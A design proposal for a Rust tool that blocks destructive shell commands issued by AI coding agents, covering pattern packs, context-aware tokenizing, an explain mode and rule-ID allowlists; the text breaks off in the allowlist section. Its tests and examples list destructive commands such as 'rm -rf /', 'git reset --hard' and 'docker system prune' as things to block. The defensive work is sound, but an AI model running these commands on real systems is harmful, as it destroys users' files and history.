# DCG Improvement Plan

> **Author:** Claude Opus 4.5
> **Date:** 2026-01-07 (Revised 2026-01-08)
> **Status:** Proposal (Enhanced Hybrid Version)
> **Scope:** Strategic improvements to make DCG more robust, reliable, performant, intuitive, and user-friendly

---

## Executive Summary

This document presents seven strategic improvements to the Destructive Command Guard (DCG) project, selected from an initial pool of 30 ideas through rigorous evaluation. The improvements are ordered by **dependency and impact**—foundational correctness must come before user-facing features.

### Evaluation Criteria

Each improvement was assessed on four dimensions:

1. **Impact** — How significantly does this improve the user experience?
2. **Pragmatism** — How practical is implementation given current architecture?
3. **User Perception** — How will users receive this change?
4. **Risk** — What could go wrong, and how do we mitigate it?

### The Seven Improvements (Ranked by Implementation Order)

| Rank | Improvement | Primary Value | Phase |
|------|-------------|---------------|-------|
| 1 | Core Correctness & Determinism | Foundation & Trust | Must-Fix |
| 2 | False Positive Immunity (Execution Context) | Velocity & Adoption | Critical |
| 3 | Explain Mode with Full Decision Trace | Transparency & Debugging | High |
| 4 | Allowlisting by Rule ID | Customization & Safety | High |
| 5 | Tiered Heredoc & Inline Script Scanning | Deep Protection | Medium |
| 6 | Pre-Commit Hook & GitHub Action | Team-Wide Protection | Medium |
| 7 | Test Infrastructure & Performance Guardrails | Reliability & Sustainability | Ongoing |

The improvements form a coherent strategy that transforms DCG from "a hook that blocks things" into "a trusted security layer that users understand, can customize, and that protects entire teams."

---

## Table of Contents

1. [Current Actual State (Important Gaps)](#current-actual-state-important-gaps)
2. [Design Principles](#design-principles)
3. [Core Correctness & Determinism](#1-core-correctness--determinism)
4. [False Positive Immunity (Execution Context Layer)](#2-false-positive-immunity-execution-context-layer)
5. [Explain Mode with Full Decision Trace](#3-explain-mode-with-full-decision-trace)
6. [Allowlisting by Rule ID](#4-allowlisting-by-rule-id)
7. [Tiered Heredoc & Inline Script Scanning](#5-tiered-heredoc--inline-script-scanning)
8. [Pre-Commit Hook & GitHub Action](#6-pre-commit-hook--github-action)
9. [Test Infrastructure & Performance Guardrails](#7-test-infrastructure--performance-guardrails)
10. [Comprehensive Ideas Analysis (30 Ideas)](#comprehensive-ideas-analysis-30-ideas)
11. [Implementation Roadmap](#implementation-roadmap)
12. [Success Metrics](#success-metrics)

---

## Current Actual State (Important Gaps)

Before proposing improvements, we must acknowledge the current gaps that undermine trust and effectiveness. These must be fixed before adding new features.

### Gap 1: Non-Core Packs Are Unreachable in Hook Mode

There is an early-return quick reject that only checks for `git`/`rm` keywords. If a command is `docker ...` or `kubectl ...`, the hook returns before evaluating packs. This means **enabled packs can silently not run**.

**Trust-killer**: `dcg test` might report "BLOCKED," while the actual hook would allow the same command.

**Location**: `src/main.rs:587`, `src/packs/mod.rs:383` (`global_quick_reject` only checks `git`/`rm`)

**Reproduction**:
```bash
# With containers.docker enabled:
echo '{"tool_name":"Bash","tool_input":{"command":"docker system prune"}}' | dcg
# Expected: DENY (pack containers.docker, pattern system-prune)
# Actual: ALLOW (early return before pack evaluation)
```

### Gap 2: Decision Nondeterminism

Pack evaluation order can be derived from `HashSet` iteration order. If multiple packs match, the chosen pack/reason can vary run-to-run.

**Why this matters**:
- Unreliable debugging ("why did it block differently this time?")
- Allowlisting by rule ID fails if rule ID changes
- Inconsistent E2E test results
- Eroded user trust

### Gap 3: Duplicate Legacy Matching Logic

Legacy pattern matching is duplicated in `src/main.rs` in addition to the pack system. This creates:
- Drift between implementations
- "Works in one mode but not the other" bugs
- Maintenance burden

### Gap 4: Per-Command Regex Compilation

Config overrides that compile regex at runtime per command introduce latency spikes and unpredictability. Patterns should be precompiled at startup.

### Gap 5: Naming Drift

References to `git_safety_guard` remain in env vars, comments, and scripts. Naming confusion causes misconfiguration.

### Gap 6: False Positives via Context Blindness

The core UX pain: substring matching blocks commands that merely *mention* dangerous commands in strings (commit messages, issue descriptions, grep patterns).

**Examples that MUST be allowed**:
- `bd create --description="This blocks rm -rf"`
- `git commit -m "Fix git reset --hard detection"`
- `echo "example: git push --force"`
- `rg -n "rm -rf" src/main.rs`

---

## Design Principles

These principles guide all decisions and trade-offs.

### P0: Never Hang, Never Crash, Never Spike Unpredictably

This tool runs for every Bash command. Stability and bounded worst-case behavior is non-negotiable.

- Maximum command processing time: 10ms (hard cap)
- Fail-open on any timeout or parse error (with logging)
- No unbounded recursion or allocation

### P1: Default Allow, Confidently Deny Known Catastrophes

Unrecognized commands should not break workflows. But high-confidence catastrophic commands should be denied.

- Unknown → Allow
- Ambiguous → Allow (or warn, never hard deny)
- Known dangerous → Deny with clear explanation

### P2: Deterministic and Explainable Decisions

Same input → same decision → same attribution. Every time.

- Stable pack ordering (explicit tiers, not hash iteration)
- Pattern identity: `(pack_id, pattern_name)` in all output
- Decision trace available via `dcg explain`

### P3: False Positives Are a First-Class Problem

False positives destroy trust and velocity. A guard that users disable is strictly worse than a slightly less strict guard that stays enabled.

- Context-aware detection (data vs executed)
- Easy allowlisting (by rule ID, not raw regex)
- Observe mode for safe rollout

### P4: Incremental Delivery

Prefer small, test-driven, high-impact increments:

1. Fix correctness first
2. Then reduce false positives
3. Then add deeper scanning
4. Then add UX/explainability
5. Always maintain performance budgets and tests

---

## 1. Core Correctness & Determinism

### Overview

Before any new features, we must fix the foundational bugs that undermine trust. This improvement addresses pack reachability, decision determinism, evaluator unification, and config precompilation.

### The Problems

1. **Pack Reachability Bug**: Enabled packs don't run if the global quick reject doesn't see their keywords
2. **Nondeterminism**: `HashSet` iteration order makes decisions unpredictable
3. **Duplicate Logic**: Hook mode and CLI use different code paths
4. **Runtime Compilation**: Config overrides compile regex per-command

### The Solutions

#### 1.1 Pack-Aware Global Quick Reject

Replace the hardcoded `git`/`rm` check with a dynamic keyword union from all enabled packs.

```rust
/// Compute the union of keywords from all enabled packs.
fn compute_enabled_keywords(config: &Config) -> Vec<&'static str> {
    let enabled_packs = config.expand_enabled_packs();
    enabled_packs
        .iter()
        .flat_map(|pack_id| REGISTRY.get(pack_id).map(|p| p.keywords))
        .flatten()
        .collect::<HashSet<_>>()
        .into_iter()
        .collect()
}

/// Global quick reject: only skip if NO enabled pack keywords appear.
pub fn global_quick_reject(command: &str, enabled_keywords: &[&str]) -> QuickRejectResult {
    let cmd_bytes = command.as_bytes();
    for kw in enabled_keywords {
        if memmem::find(cmd_bytes, kw.as_bytes()).is_some() {
            return QuickRejectResult::Continue; // Keyword found, proceed to evaluation
        }
    }
    QuickRejectResult::Skip // No keywords, safe to skip
}
```

**User Impact**: "Docker/kubectl protections actually work."

#### 1.2 Deterministic Pack Ordering

Evaluate packs in a stable, documented order using explicit tiers:

```rust
/// Pack evaluation tiers (evaluated in order, first match wins).
const PACK_TIERS: &[&[&str]] = &[
    // Tier 0: Core safety (always first)
    &["core.git", "core.filesystem"],

    // Tier 1: Infrastructure
    &["infrastructure.terraform", "infrastructure.ansible", "infrastructure.pulumi"],

    // Tier 2: Containers & Orchestration
    &["containers.docker", "containers.podman", "kubernetes.kubectl", "kubernetes.helm"],

    // Tier 3: Databases
    &["database.postgresql", "database.mysql", "database.mongodb", "database.redis"],

    // Tier 4: Strict policies (opt-in)
    &["strict_git.force_push", "strict_git.branch_delete"],

    // Tier 5: Package managers
    &["package_managers.npm", "package_managers.cargo", "package_managers.pip"],
];

/// Evaluate packs in tier order, returning stable (pack_id, pattern_name).
pub fn evaluate_packs(command: &str, enabled_packs: &HashSet<&str>) -> Option<Match> {
    for tier in PACK_TIERS {
        for pack_id in *tier {
            if !enabled_packs.contains(pack_id) {
                continue;
            }
            if let Some(pack) = REGISTRY.get(pack_id) {
                if let Some(pattern) = pack.check(command) {
                    return Some(Match {
                        pack_id: pack_id.to_string(),
                        pattern_name: pattern.name.to_string(),
                        reason: pattern.reason.to_string(),
                    });
                }
            }
        }
    }
    None
}
```

**User Impact**: "Deny reasons don't change randomly."

#### 1.3 Stable Match Identity

Every denial includes `(pack_id, pattern_name)`:

```rust
#[derive(Debug, Clone, Serialize)]
pub struct Match {
    pub pack_id: String,
    pub pattern_name: String,
    pub reason: String,
    pub matched_text: String,
    pub matched_span: (usize, usize),
}

// JSON output includes stable identity
{
  "hookSpecificOutput": {
    "permissionDecision": "deny",
    "permissionDecisionReason": "Hard reset can permanently lose commits",
    "matchedRule": {
      "packId": "core.git",
      "patternName": "hard-reset"
    }
  }
}
```

**User Impact**: "Block messages feel concrete and actionable. I can allowlist by rule ID."

#### 1.4 Shared Evaluator

Hook mode and `dcg test` must call identical evaluation logic:

```rust
/// The single source of truth for command evaluation.
/// Used by both hook mode and CLI.
pub fn evaluate_command(
    command: &str,
    config: &Config,
    trace: Option<&mut ExplainTrace>,
) -> Decision {
    // 1. Quick reject (pack-aware)
    // 2. Normalize command
    // 3. Check allowlist
    // 4. Evaluate safe patterns
    // 5. Evaluate destructive patterns (tiered order)
    // 6. Default allow
}

// Hook mode
fn hook_main() {
    let decision = evaluate_command(&command, &config, None);
    // ...
}

// CLI mode
fn cli_test(command: &str) {
    let decision = evaluate_command(command, &config, None);
    println!("{:?}", decision);
}

// Explain mode
fn cli_explain(command: &str) {
    let mut trace = ExplainTrace::new();
    let decision = evaluate_command(command, &config, Some(&mut trace));
    println!("{}", trace.format());
}
```

**User Impact**: "What I see in `dcg test` is what the hook enforces."

#### 1.5 Precompile Override Regex

Compile config overrides once at startup, not per-command:

```rust
pub struct CompiledConfig {
    /// Precompiled regex patterns from config overrides.
    pub compiled_overrides: Vec<CompiledOverride>,
    /// Precomputed enabled pack IDs.
    pub enabled_pack_ids: HashSet<String>,
    /// Precomputed keyword union for quick reject.
    pub enabled_keywords: Vec<&'static str>,
}

impl CompiledConfig {
    pub fn from_config(config: &Config) -> Result<Self, ConfigError> {
        let compiled_overrides = config.overrides
            .iter()
            .filter_map(|o| {
                match Regex::new(&o.pattern) {
                    Ok(regex) => Some(CompiledOverride { regex, action: o.action }),
                    Err(e) => {
                        tracing::warn!("Invalid override pattern '{}': {}", o.pattern, e);
                        None
                    }
                }
            })
            .collect();

        // ... precompute enabled packs and keywords

        Ok(Self { compiled_overrides, enabled_pack_ids, enabled_keywords })
    }
}
```

**User Impact**: "No more random latency spikes."

### Tests Required

```rust
#[test]
fn test_docker_pack_reachable_in_hook_mode() {
    let config = Config::with_pack_enabled("containers.docker");
    let input = r#"{"tool_name":"Bash","tool_input":{"command":"docker system prune"}}"#;
    let decision = hook_evaluate(input, &config);
    assert!(matches!(decision, Decision::Deny { .. }));
}

#[test]
fn test_deterministic_pack_attribution() {
    let config = Config::default();
    let command = "git reset --hard HEAD";

    let results: Vec<_> = (0..100)
        .map(|_| evaluate_command(command, &config, None))
        .collect();

    // All results must be identical
    let first = &results[0];
    assert!(results.iter().all(|r| r == first));
}

#[test]
fn test_hook_cli_parity() {
    let config = Config::default();
    let commands = vec![
        "git reset --hard",
        "docker system prune",
        "git status",
        "echo hello",
    ];

    for cmd in commands {
        let hook_result = simulate_hook(cmd, &config);
        let cli_result = simulate_cli_test(cmd, &config);
        assert_eq!(hook_result, cli_result, "Parity failure for: {}", cmd);
    }
}
```

### Implementation Phases

**Phase A: Pack Reachability Fix (2 days)**
- Implement pack-aware quick reject
- Add regression tests for docker/k8s/db packs

**Phase B: Deterministic Ordering (1-2 days)**
- Define pack tiers
- Implement ordered evaluation
- Add determinism tests

**Phase C: Shared Evaluator (2-3 days)**
- Extract core evaluator to library
- Update hook and CLI to use shared evaluator
- Add parity tests

**Phase D: Precompilation & Cleanup (1 day)**
- Precompile config overrides
- Remove legacy duplicate logic
- Fix naming drift (git_safety_guard → dcg)

---

## 2. False Positive Immunity (Execution Context Layer)

### Overview

This is the **trust unlock**. We introduce an execution-context layer that distinguishes between bytes that are executed code vs bytes that are merely data (strings, comments, documentation). Only executable contexts are subject to destructive pattern matching.

### The Problem

Today's most damaging failure mode is blocking when the dangerous substring is **data**, not executed code. This creates:

- Velocity-destroying interruptions for coding agents
- Rapid loss of trust ("this tool is dumb / gets in the way")
- Eventual disablement of the guard

### The Solution

A two-part approach:

1. **Safe String-Argument Registry** (Phase A): Quick wins for known-safe commands
2. **Execution-Context Tokenizer** (Phase B): General solution for all commands

### 2.1 Safe String-Argument Registry

A curated, versioned registry of commands whose arguments are data, not code:

```rust
/// Registry of commands with known-safe string arguments.
/// Format: (command_prefix, arg_flags, context_type)
static SAFE_STRING_ARGS: &[(&str, &[&str], ContextType)] = &[
    // Git commit messages
    ("git commit", &["-m", "--message"], ContextType::CommitMessage),
    ("git tag", &["-m", "--message"], ContextType::TagMessage),
    ("git notes add", &["-m", "--message"], ContextType::NoteMessage),

    // Beads CLI
    ("bd create", &["--description", "--title", "--notes"], ContextType::Documentation),
    ("bd update", &["--description", "--title", "--notes"], ContextType::Documentation),

    // Search tools (patterns are data, not executed)
    ("grep", &["-e", "--regexp", "-f", "--file"], ContextType::SearchPattern),
    ("rg", &["-e", "--regexp", "-f", "--file"], ContextType::SearchPattern),
    ("ag", &["-p", "--pattern"], ContextType::SearchPattern),

    // Output commands (arguments are data)
    ("echo", &[], ContextType::EchoOutput),
    ("printf", &[], ContextType::PrintfOutput),
    ("cat", &["<<"], ContextType::HeredocData),

    // Documentation generators
    ("man", &[], ContextType::Documentation),
    ("help", &[], ContextType::Documentation),
];

#[derive(Debug, Clone, Copy)]
pub enum ContextType {
    CommitMessage,
    TagMessage,
    NoteMessage,
    Documentation,
    SearchPattern,
    EchoOutput,
    PrintfOutput,
    HeredocData,
}

/// Check if a command has a known-safe string argument context.
pub fn check_safe_string_context(command: &str) -> Option<SafeContext> {
    for (prefix, flags, context_type) in SAFE_STRING_ARGS {
        if command.starts_with(prefix) {
            // Check if command uses one of the safe flags
            for flag in *flags {
                if command.contains(flag) {
                    return Some(SafeContext {
                        command_prefix: prefix,
                        flag: Some(flag),
                        context_type: *context_type,
                    });
                }
            }
            // Some commands (echo, printf) are always safe
            if flags.is_empty() {
                return Some(SafeContext {
                    command_prefix: prefix,
                    flag: None,
                    context_type: *context_type,
                });
            }
        }
    }
    None
}
```

**User Impact**: Immediate reduction in annoying blocks. Common documentation workflows work.

### 2.2 Execution-Context Tokenizer

A conservative shell tokenizer that classifies command spans:

```rust
/// Span of command text with execution context.
#[derive(Debug, Clone)]
pub struct Span {
    pub start: usize,
    pub end: usize,
    pub kind: SpanKind,
    pub text: String,
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum SpanKind {
    /// Executable command word (first word of pipeline segment)
    Executed,
    /// Argument that may be executed (needs pattern matching)
    Argument,
    /// Inline code that will be executed (bash -c, python -c, etc.)
    InlineCode,
    /// Data that will NOT be executed (string arguments, heredoc content)
    Data,
    /// Heredoc body (may contain executable content, needs deep analysis)
    HeredocBody,
    /// Unknown/ambiguous (treat conservatively as Executed)
    Unknown,
}

/// Tokenize a command into spans with execution context.
pub fn tokenize_command(command: &str) -> Vec<Span> {
    let mut spans = Vec::new();
    let mut parser = ShellParser::new(command);

    while let Some(token) = parser.next_token() {
        match token {
            Token::CommandWord(text, range) => {
                spans.push(Span {
                    start: range.start,
                    end: range.end,
                    kind: SpanKind::Executed,
                    text,
                });
            }
            Token::Argument(text, range) => {
                // Check if this argument is known-safe data
                let kind = if is_safe_string_argument(&parser.context, &text) {
                    SpanKind::Data
                } else {
                    SpanKind::Argument
                };
                spans.push(Span { start: range.start, end: range.end, kind, text });
            }
            Token::SingleQuoted(text, range) => {
                // Single-quoted strings are literal data
                spans.push(Span {
                    start: range.start,
                    end: range.end,
                    kind: SpanKind::Data,
                    text,
                });
            }
            Token::DoubleQuoted(text, range) => {
                // Double-quoted may contain substitutions
                let kind = if contains_substitution(&text) {
                    SpanKind::Unknown // Conservative
                } else {
                    SpanKind::Data
                };
                spans.push(Span { start: range.start, end: range.end, kind, text });
            }
            Token::CommandSubstitution(text, range) => {
                // $(...) or `...` is executed
                spans.push(Span {
                    start: range.start,
                    end: range.end,
                    kind: SpanKind::Executed,
                    text,
                });
            }
            Token::InlineScript(text, range) => {
                // bash -c "...", python -c "...", etc.
                spans.push(Span {
                    start: range.start,
                    end: range.end,
                    kind: SpanKind::InlineCode,
                    text,
                });
            }
            Token::HeredocBody(text, range) => {
                spans.push(Span {
                    start: range.start,
                    end: range.end,
                    kind: SpanKind::HeredocBody,
                    text,
                });
            }
            Token::Pipe | Token::And | Token::Or | Token::Semicolon => {
                // Pipeline operators don't contribute spans
                parser.start_new_segment();
            }
        }
    }

    spans
}

/// Evaluate patterns only against eligible spans.
pub fn evaluate_with_context(command: &str, config: &Config) -> Decision {
    let spans = tokenize_command(command);

    // Fast path: if command matches safe string-arg registry, skip pattern matching
    if let Some(safe_ctx) = check_safe_string_context(command) {
        return Decision::Allow {
            reason: format!("Safe context: {:?}", safe_ctx.context_type),
        };
    }

    // Only evaluate executable spans
    for span in &spans {
        match span.kind {
            SpanKind::Executed | SpanKind::InlineCode | SpanKind::Unknown => {
                if let Some(m) = evaluate_packs(&span.text, &config.enabled_packs) {
                    return Decision::Deny {
                        pack_id: m.pack_id,
                        pattern_name: m.pattern_name,
                        reason: m.reason,
                        matched_text: span.text.clone(),
                        matched_span: (span.start, span.end),
                    };
                }
            }
            SpanKind::HeredocBody => {
                // Heredoc bodies need deep analysis (see Section 5)
                if let Some(m) = evaluate_heredoc(&span.text, config) {
                    return Decision::Deny { /* ... */ };
                }
            }
            SpanKind::Data | SpanKind::Argument => {
                // Data spans are never matched against destructive patterns
            }
        }
    }

    Decision::Allow { reason: "No destructive patterns matched".to_string() }
}
```

### Example: How Context Parsing Works

```
Command: git commit -m "Fix the rm -rf detection bug"

Tokenization:
┌─────────────────────────────────────────────────────────────┐
│ [0:3]   "git"      → Executed (command word)               │
│ [4:10]  "commit"   → Argument                               │
│ [11:13] "-m"       → Argument                               │
│ [14:44] "Fix the rm -rf detection bug"                     │
│                    → Data (commit message flag)             │
└─────────────────────────────────────────────────────────────┘

Pattern Matching:
- "git" span: no destructive match
- "commit" span: no destructive match
- "-m" span: no destructive match
- Message span: SKIPPED (SpanKind::Data)

Decision: ALLOW ✓
```

```
Command: bash -c "rm -rf /"

Tokenization:
┌─────────────────────────────────────────────────────────────┐
│ [0:4]   "bash"     → Executed (command word)               │
│ [5:7]   "-c"       → Argument (inline script flag)         │
│ [8:19]  "rm -rf /" → InlineCode (EXECUTED!)                │
└─────────────────────────────────────────────────────────────┘

Pattern Matching:
- "bash" span: no destructive match
- "-c" span: no match
- Inline script span: MATCHED (core.filesystem:rm-rf-root)

Decision: DENY ✗
```

### Conservative Design Principles

1. **Ambiguous → Executed**: If we can't confidently classify a span as data, treat it as executable
2. **Unknown commands → Full matching**: Only known-safe commands get data classification
3. **Single quotes are data**: `'...'` is always literal (shell semantics)
4. **Double quotes with substitution → Unknown**: `"$(...)"` might be dangerous

### Tests Required

```rust
#[test]
fn test_must_allow_documentation_commands() {
    let allowed = vec![
        r#"bd create --description="This blocks rm -rf attacks""#,
        r#"git commit -m "Fix git reset --hard detection""#,
        r#"echo "example: git push --force""#,
        r#"rg -n "rm -rf" src/main.rs"#,
        r#"printf "Dangerous: %s\n" "rm -rf /""#,
    ];

    for cmd in allowed {
        let decision = evaluate_command(cmd, &Config::default(), None);
        assert!(
            matches!(decision, Decision::Allow { .. }),
            "Should allow documentation command: {}", cmd
        );
    }
}

#[test]
fn test_must_block_execution_contexts() {
    let blocked = vec![
        r#"bash -c "rm -rf /""#,
        r#"python -c "import os; os.system('rm -rf /')""#,
        r#"sh -c 'git reset --hard'"#,
        r#"git status; rm -rf /"#,
        r#"$(rm -rf /)"#,
        r#"`rm -rf /`"#,
    ];

    for cmd in blocked {
        let decision = evaluate_command(cmd, &Config::default(), None);
        assert!(
            matches!(decision, Decision::Deny { .. }),
            "Should block execution context: {}", cmd
        );
    }
}
```

### Implementation Phases

**Phase A: Safe String-Argument Registry (2-3 days)**
- Implement registry data structure
- Add entries for git, bd, grep, rg, echo, printf
- Unit tests for each entry
- E2E regression tests for common false positives

**Phase B: Minimal Conservative Tokenizer (3-5 days)**
- Handle quotes/escapes, pipes, separators
- Handle `$()`, backticks
- Handle `-c`/`-e` inline script detection
- Extensive unit tests

**Phase C: Integration (1-2 days)**
- Wire tokenizer into evaluation pipeline
- Token-aware keyword gating (optional optimization)
- Performance testing

---

## 3. Explain Mode with Full Decision Trace

### Overview

Explain mode is a `dcg explain "command"` subcommand that reveals the complete decision-making process. It shows users exactly why a command was blocked or allowed, what patterns were checked, how spans were classified, and what alternatives exist.

### Why It Matters

When DCG blocks a command, users immediately ask:
- "Why was this specific pattern matched?"
- "What regex actually matched?"
- "Was my string argument classified correctly?"
- "How do I test if my allowlist entry will work?"

Without answers, users lose trust. Explain mode provides complete transparency.

### The Solution

```
$ dcg explain "git reset --hard HEAD~5"

╔══════════════════════════════════════════════════════════════════════╗
║                     DCG Decision Analysis                            ║
║                                                                      ║
║  Input:    git reset --hard HEAD~5                                   ║
║  Decision: DENY                                                      ║
║  Latency:  0.847ms                                                   ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  EXECUTION CONTEXT ANALYSIS                                          ║
║  ─────────────────────────────────────────────────────────────────── ║
║                                                                      ║
║  Span Analysis:                                                      ║
║  ┌─────────────────────────────────────────────────────────────────┐ ║
║  │ [0:3]   "git"           Executed   (command word)              │ ║
║  │ [4:9]   "reset"         Argument                                │ ║
║  │ [10:16] "--hard"        Argument                                │ ║
║  │ [17:23] "HEAD~5"        Argument                                │ ║
║  └─────────────────────────────────────────────────────────────────┘ ║
║                                                                      ║
║  Safe String-Arg Registry: NO MATCH                                  ║
║  (Command "git reset" not in documentation registry)                 ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  PIPELINE TRACE                                                      ║
║  ─────────────────────────────────────────────────────────────────── ║
║                                                                      ║
║  [1] Quick Reject Filter                                    0.003ms  ║
║      ├─ Enabled pack keywords: git, rm, docker, kubectl, ...        ║
║      ├─ Found: "git" at position 0                                   ║
║      └─ Result: CONTINUE (requires full analysis)                    ║
║                                                                      ║
║  [2] Command Normalization                                  0.001ms  ║
║      ├─ Input:  git reset --hard HEAD~5                              ║
║      ├─ Output: git reset --hard HEAD~5                              ║
║      └─ Transformations: none                                        ║
║                                                                      ║
║  [3] Allowlist Check                                        0.015ms  ║
║      ├─ Checked 3 allowlist entries                                  ║
║      └─ Result: NO MATCH                                             ║
║                                                                      ║
║  [4] Pack Evaluation (Tier 0: Core)                         0.234ms  ║
║      ├─ Pack: core.git                                               ║
║      │   ├─ Pattern: hard-reset                                      ║
║      │   │   ├─ Regex: git\s+reset\s+--hard                          ║
║      │   │   ├─ Match: "git reset --hard" (positions 0-16)           ║
║      │   │   └─ Reason: Hard reset can permanently lose commits      ║
║      │   └─ MATCHED — evaluation stopped                             ║
║      └─ Result: DENY                                                 ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  MATCH VISUALIZATION                                                 ║
║  ─────────────────────────────────────────────────────────────────── ║
║                                                                      ║
║      git reset --hard HEAD~5                                         ║
║      ▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔                                               ║
║      └─── matched ────┘                                              ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  MATCH IDENTITY                                                      ║
║  ─────────────────────────────────────────────────────────────────── ║
║                                                                      ║
║  Pack ID:      core.git                                              ║
║  Pattern Name: hard-reset                                            ║
║  Rule ID:      core.git:hard-reset                                   ║
║                                                                      ║
║  To allowlist this specific rule:                                    ║
║  dcg allowlist add core.git:hard-reset --reason "..."                ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  💡 SUGGESTIONS                                                      ║
║  ─────────────────────────────────────────────────────────────────── ║
║                                                                      ║
║  Safe alternatives:                                                  ║
║  • git reset --soft HEAD~5     — Keeps changes staged                ║
║  • git reset --mixed HEAD~5    — Keeps changes unstaged (default)    ║
║  • git revert HEAD~5..HEAD     — Creates inverse commits (safe)      ║
║  • git stash                   — Saves changes before reset          ║
║                                                                      ║
║  To allow this once:                                                 ║
║  • dcg allow --once "git reset --hard HEAD~5"                        ║
║                                                                      ║
║  To allow permanently (adds to .dcg/allowlist.toml):                 ║
║  • dcg allowlist add core.git:hard-reset --reason "Intentional"      ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```

### Example: False Positive Explanation

```
$ dcg explain 'bd create --description="Fix rm -rf detection"'

╔══════════════════════════════════════════════════════════════════════╗
║                     DCG Decision Analysis                            ║
║                                                                      ║
║  Input:    bd create --description="Fix rm -rf detection"            ║
║  Decision: ALLOW                                                     ║
║  Latency:  0.124ms                                                   ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  EXECUTION CONTEXT ANALYSIS                                          ║
║  ─────────────────────────────────────────────────────────────────── ║
║                                                                      ║
║  Span Analysis:                                                      ║
║  ┌─────────────────────────────────────────────────────────────────┐ ║
║  │ [0:2]   "bd"              Executed  (command word)             │ ║
║  │ [3:9]   "create"          Argument                              │ ║
║  │ [10:23] "--description"   Argument  (safe string flag)         │ ║
║  │ [24:47] "Fix rm -rf..."   Data      (documentation content)    │ ║
║  └─────────────────────────────────────────────────────────────────┘ ║
║                                                                      ║
║  ✓ Safe String-Arg Registry: MATCHED                                ║
║    Command: bd create                                                ║
║    Flag: --description                                               ║
║    Context: Documentation                                            ║
║                                                                      ║
║  → Pattern matching SKIPPED for Data spans                           ║
║  → Result: ALLOW                                                     ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```

### Technical Design

```rust
/// Trace of a single decision step in the pipeline.
#[derive(Debug, Clone)]
pub struct TraceStep {
    pub name: &'static str,
    pub duration: Duration,
    pub details: TraceDetails,
}

#[derive(Debug, Clone)]
pub enum TraceDetails {
    QuickReject {
        enabled_keywords: Vec<&'static str>,
        keyword_found: Option<(&'static str, usize)>,
        result: QuickRejectResult,
    },
    ContextAnalysis {
        spans: Vec<Span>,
        safe_string_match: Option<SafeContext>,
    },
    Normalization {
        input: String,
        output: String,
        transformations: Vec<String>,
    },
    AllowlistCheck {
        entries_checked: usize,
        matched_entry: Option<AllowlistEntry>,
    },
    PackEvaluation {
        tier: usize,
        tier_name: String,
        pack_id: String,
        patterns_checked: Vec<PatternResult>,
        matched: Option<Match>,
    },
}

/// Complete trace of a command analysis.
#[derive(Debug)]
pub struct ExplainTrace {
    pub command: String,
    pub decision: Decision,
    pub steps: Vec<TraceStep>,
    pub total_duration: Duration,
    pub match_identity: Option<MatchIdentity>,
    pub suggestions: Vec<Suggestion>,
}

/// Stable identity for a match (used for allowlisting).
#[derive(Debug, Clone, Serialize)]
pub struct MatchIdentity {
    pub pack_id: String,
    pub pattern_name: String,
    pub rule_id: String,  // "pack_id:pattern_name"
}
```

### Output Formats

**Pretty (Default)**: Colorful box drawing for terminals
**JSON**: Machine-readable for tooling
**Compact**: Single-line for logs

```bash
$ dcg explain "git reset --hard" --format json
{
  "command": "git reset --hard",
  "decision": "deny",
  "match_identity": {
    "pack_id": "core.git",
    "pattern_name": "hard-reset",
    "rule_id": "core.git:hard-reset"
  },
  "context_analysis": {
    "spans": [...],
    "safe_string_match": null
  },
  "suggestions": [...]
}

$ dcg explain "git reset --hard" --format compact
DENY core.git:hard-reset "git reset --hard" — Hard reset can permanently lose commits (0.847ms)
```

### Implementation Phases

**Phase 1: Core Trace Infrastructure (2-3 days)**
- Add `ExplainTrace` struct and builder
- Modify evaluation pipeline to optionally collect trace
- Basic pretty-print output

**Phase 2: Context Analysis Display (1-2 days)**
- Show span classification in output
- Show safe string-arg registry matches
- Highlight data vs executed spans

**Phase 3: Rich Output (1-2 days)**
- JSON and compact formats
- Match visualization with highlighting
- Timing breakdown

**Phase 4: Suggestions (2-3 days)**
- Build suggestions database for all patterns
- Context-aware suggestion selection
- Allowlist commands in output

---

## 4. Allowlisting by Rule ID

### Overview

Users can allowlist specific rules by their stable identity `(pack_id, pattern_name)` rather than writing dangerous raw regex patterns. This is safer, simpler, and more maintainable.

### Why Rule ID, Not Regex?

| Approach | Example | Safety | Maintainability |
|----------|---------|--------|-----------------|
| Raw regex | `pattern = "rm -rf.*"` | ⚠️ Dangerous | ⚠️ Fragile |
| Rule ID | `rule = "core.git:hard-reset"` | ✓ Safe | ✓ Stable |

Rule ID allowlisting:
- Only bypasses the specific rule that matched
- Cannot accidentally match unrelated commands
- Survives pattern updates (regex changes don't break allowlist)
- Easy to audit ("which rules are bypassed?")

### The Solution

```toml
# .dcg/allowlist.toml

# Allowlist by rule ID (recommended)
[[allow]]
rule = "core.git:hard-reset"
reason = "Intentional hard resets during development"
added_by = "alice@example.com"
added_at = 2026-01-07T15:30:00Z
environments = ["development"]  # Optional: only in dev

# Allowlist by rule ID with conditions
[[allow]]
rule = "core.filesystem:rm-rf-variable"
reason = "CI cleanup script, variable is validated upstream"
conditions = { CI = "true" }

# Allowlist by exact command (for one-off cases)
[[allow]]
exact_command = "rm -rf /tmp/dcg-test-artifacts"
reason = "Test cleanup"
expires_at = 2026-06-01T00:00:00Z

# Allowlist by command prefix (for known-safe tools)
[[allow]]
command_prefix = "bd create"
context = "string-argument"
reason = "Beads CLI descriptions are documentation"
```

### CLI Commands

```bash
# Add allowlist entry by rule ID (recommended)
$ dcg allowlist add core.git:hard-reset --reason "Development workflow"
Added rule 'core.git:hard-reset' to .dcg/allowlist.toml

# Add with conditions
$ dcg allowlist add core.filesystem:rm-rf-variable \
    --reason "CI cleanup" \
    --condition "CI=true"

# Add exact command (for one-off)
$ dcg allowlist add-command "rm -rf /tmp/old-build" \
    --reason "One-time cleanup" \
    --expires 2026-02-01

# List allowlist entries
$ dcg allowlist list
┌─────────────────────────────────────────────────────────────────────────┐
│ Allowlist Entries (.dcg/allowlist.toml)                                 │
